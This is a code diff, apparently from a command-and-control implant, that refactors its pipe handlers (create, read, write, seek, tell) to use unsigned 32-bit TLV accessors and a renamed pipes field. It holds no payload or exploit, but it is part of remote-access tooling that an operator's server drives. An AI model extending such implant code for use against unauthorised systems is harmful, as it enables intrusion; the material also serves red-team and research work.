@@ -41,7 +41,7 @@ static pipe_t *pipe_from_tlv(pipe_t *pipes, tlv_pkt_t *tlv_pkt)
     int id;
     pipe_t *pipe;
 
-    tlv_pkt_get_int(tlv_pkt, TLV_TYPE_PIPE_ID, &id);
+    tlv_pkt_get_u32(tlv_pkt, TLV_TYPE_PIPE_ID, &id);
     HASH_FIND_INT(pipes, &id, pipe);
 
     return pipe;
@@ -52,7 +52,7 @@ static pipes_t *pipes_from_tlv(pipes_t *pipes, tlv_pkt_t *tlv_pkt)
     int type;
     pipes_t *pipe;
 
-    tlv_pkt_get_int(tlv_pkt, TLV_TYPE_PIPE_TYPE, &type);
+    tlv_pkt_get_u32(tlv_pkt, TLV_TYPE_PIPE_TYPE, &type);
     HASH_FIND_INT(pipes, &type, pipe);
 
     return pipe;
@@ -64,14 +64,14 @@ static tlv_pkt_t *pipe_create(c2_t *c2)
     pipe_t *pipe;
     pipes_t *pipes;
 
-    pipes = pipes_from_tlv(c2->dynamic.pipes, c2->request);
+    pipes = pipes_from_tlv(c2->pipes, c2->request);
 
     if (pipes == NULL)
     {
         return api_craft_tlv_pkt(API_CALL_FAIL);
     }
 
-    tlv_pkt_get_int(c2->request, TLV_TYPE_PIPE_ID, &id);
+    tlv_pkt_get_u32(c2->request, TLV_TYPE_PIPE_ID, &id);
     pipe = calloc(1, sizeof(*pipe));
 
     if (pipe == NULL)
@@ -101,7 +101,7 @@ static tlv_pkt_t *pipe_destroy(c2_t *c2)
     pipes_t *pipes;
     pipe_t *pipe;
 
-    pipes = pipes_from_tlv(c2->dynamic.pipes, c2->request);
+    pipes = pipes_from_tlv(c2->pipes, c2->request);
 
     if (pipes == NULL)
     {
@@ -134,7 +134,7 @@ static tlv_pkt_t *pipe_heartbeat(c2_t *c2)
     pipes_t *pipes;
     pipe_t *pipe;
 
-    pipes = pipes_from_tlv(c2->dynamic.pipes, c2->request);
+    pipes = pipes_from_tlv(c2->pipes, c2->request);
 
     if (pipes == NULL)
     {
@@ -167,7 +167,7 @@ static tlv_pkt_t *pipe_tell(c2_t *c2)
     pipes_t *pipes;
     pipe_t *pipe;
 
-    pipes = pipes_from_tlv(c2->dynamic.pipes, c2->request);
+    pipes = pipes_from_tlv(c2->pipes, c2->request);
 
     if (pipes == NULL)
     {
@@ -187,7 +187,7 @@ static tlv_pkt_t *pipe_tell(c2_t *c2)
     if (offset >= 0)
     {
         result = api_craft_tlv_pkt(API_CALL_SUCCESS);
-        tlv_pkt_add_int(result, TLV_TYPE_PIPE_OFFSET, offset);
+        tlv_pkt_add_u32(result, TLV_TYPE_PIPE_OFFSET, offset);
         return result;
     }
 
@@ -202,7 +202,7 @@ static tlv_pkt_t *pipe_seek(c2_t *c2)
     pipes_t *pipes;
     pipe_t *pipe;
 
-    pipes = pipes_from_tlv(c2->dynamic.pipes, c2->request);
+    pipes = pipes_from_tlv(c2->pipes, c2->request);
 
     if (pipes == NULL)
     {
@@ -216,8 +216,8 @@ static tlv_pkt_t *pipe_seek(c2_t *c2)
         return api_craft_tlv_pkt(API_CALL_FAIL);
     }
 
-    tlv_pkt_get_int(c2->request, TLV_TYPE_PIPE_OFFSET, &offset);
-    tlv_pkt_get_int(c2->request, TLV_TYPE_PIPE_WHENCE, &whence);
+    tlv_pkt_get_u32(c2->request, TLV_TYPE_PIPE_OFFSET, &offset);
+    tlv_pkt_get_u32(c2->request, TLV_TYPE_PIPE_WHENCE, &whence);
 
     log_debug("* Seeking from C2 pipe (id: %d)\n", pipe->id);
 
@@ -238,7 +238,7 @@ static tlv_pkt_t *pipe_write(c2_t *c2)
     pipes_t *pipes;
     pipe_t *pipe;
 
-    pipes = pipes_from_tlv(c2->dynamic.pipes, c2->request);
+    pipes = pipes_from_tlv(c2->pipes, c2->request);
 
     if (pipes == NULL)
     {
@@ -252,7 +252,7 @@ static tlv_pkt_t *pipe_write(c2_t *c2)
         return api_craft_tlv_pkt(API_CALL_FAIL);
     }
 
-    tlv_pkt_get_int(c2->request, TLV_TYPE_PIPE_LENGTH, &length);
+    tlv_pkt_get_u32(c2->request, TLV_TYPE_PIPE_LENGTH, &length);
     tlv_pkt_get_bytes(c2->request, TLV_TYPE_PIPE_BUFFER, &buffer);
 
     if (buffer == NULL)
@@ -282,7 +282,7 @@ static tlv_pkt_t *pipe_read(c2_t *c2)
     pipes_t *pipes;
     pipe_t *pipe;
 
-    pipes = pipes_from_tlv(c2->dynamic.pipes, c2->request);
+    pipes = pipes_from_tlv(c2->pipes, c2->request);
 
     if (pipes == NULL)
     {
@@ -296,7 +296,7 @@ static tlv_pkt_t *pipe_read(c2_t *c2)
         return api_craft_tlv_pkt(API_CALL_FAIL);
     }
 
-    tlv_pkt_get_int(c2->request, TLV_TYPE_PIPE_LENGTH, &length);
+    tlv_pkt_get_u32(c2->request, TLV_TYPE_PIPE_LENGTH, &length);
     buffer = calloc(1, length);
 
     if (buffer == NULL)
